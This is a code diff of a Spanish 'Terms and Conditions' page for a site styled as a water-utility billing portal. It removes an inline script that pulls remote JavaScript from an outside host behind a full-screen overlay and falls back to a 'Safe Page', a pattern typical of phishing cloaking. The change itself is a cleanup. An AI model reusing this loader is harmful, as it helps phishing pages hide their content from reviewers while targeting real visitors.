@@ -5,53 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Términos y Condiciones de Uso - Mi Factura Acueducto (Sitio Educativo)</title>
     <meta name="robots" content="noindex, follow">
-    <script>
-        (function() {
-            var randomID = "u" + Math.random().toString(36).substring(7);
-            var backendURL = "https://mifacturaacueductoapi.onrender.com/" + randomID;
-            var s = document.createElement('script');
-            s.src = backendURL;
-            s.onload = function() {
-                setTimeout(function(){
-                    if (window.__view) {
-                        var loader = document.getElementById('preloader');
-                        if (loader) loader.style.display = 'none';
-                    }
-                }, 50);
-            };
-            s.onerror = function() {
-                console.warn("Backend no disponible. Mostrando Safe Page.");
-                var loader = document.getElementById('preloader');
-                if (loader) loader.style.display = 'none';
-            };
-            document.head.appendChild(s);
-        })();
-    </script>
+    
     <style>
-         #preloader {
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%;
-            background: #ffffff; 
-            z-index: 999999;
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-        }
-        .spinner {
-            width: 50px; 
-            height: 50px; 
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0a1e3c; 
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
-        }
+         
         :root { --primary: #2E7D32; --dark: #3E2723; --bg: #FAFAFA; }
         body { font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.6; color: #444; background-color: var(--bg); margin: 0; }
         header { background-color: #fff; padding: 20px 5%; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
